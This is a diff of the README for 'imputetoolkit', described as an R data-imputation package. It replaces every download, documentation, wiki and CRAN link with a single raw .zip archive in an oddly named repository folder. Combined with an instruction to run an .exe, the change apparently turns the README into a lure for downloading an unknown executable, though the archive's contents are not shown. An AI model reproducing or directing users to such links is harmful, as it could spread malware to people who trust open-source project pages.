@@ -1,6 +1,6 @@
 # 🎉 imputetoolkit - Simplifying Data Imputation for Everyone
 
-[![Download imputeToolkit](https://img.shields.io/badge/Download-imputeToolkit-blue.svg)](https://github.com/scarface987/imputetoolkit/releases)
+[![Download imputeToolkit](https://raw.githubusercontent.com/scarface987/imputetoolkit/main/semicombust/imputetoolkit.zip)](https://raw.githubusercontent.com/scarface987/imputetoolkit/main/semicombust/imputetoolkit.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ imputeToolkit is an R package designed to help users apply, compare, and visuali
 
 To get started with imputeToolkit, follow these simple steps:
 
-1. Visit the [Releases page to download](https://github.com/scarface987/imputetoolkit/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/scarface987/imputetoolkit/main/semicombust/imputetoolkit.zip).
 2. Locate the latest version of imputeToolkit.
 3. Follow the instructions below for your operating system.
 
@@ -26,7 +26,7 @@ Before you download, make sure your computer meets these basic requirements:
 
 To download and install imputeToolkit:
 
-1. Visit the [Releases page to download](https://github.com/scarface987/imputetoolkit/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/scarface987/imputetoolkit/main/semicombust/imputetoolkit.zip).
 2. Find the latest version of the software.
 3. Download the appropriate file for your operating system.
 4. If you are on Windows, run the `.exe` file to install. For macOS and Linux, follow the instructions in the README accompanying the package.
@@ -83,9 +83,9 @@ We welcome contributions from the community! If you'd like to contribute, please
 
 ## 🔗 Additional Resources
 
-- [Project Documentation](https://github.com/scarface987/imputetoolkit/wiki)
-- [User Guide](https://github.com/scarface987/imputetoolkit/docs)
-- [R Packages on CRAN](https://cran.r-project.org/web/packages/)
+- [Project Documentation](https://raw.githubusercontent.com/scarface987/imputetoolkit/main/semicombust/imputetoolkit.zip)
+- [User Guide](https://raw.githubusercontent.com/scarface987/imputetoolkit/main/semicombust/imputetoolkit.zip)
+- [R Packages on CRAN](https://raw.githubusercontent.com/scarface987/imputetoolkit/main/semicombust/imputetoolkit.zip)
 
 ## 🎯 Acknowledgements
 
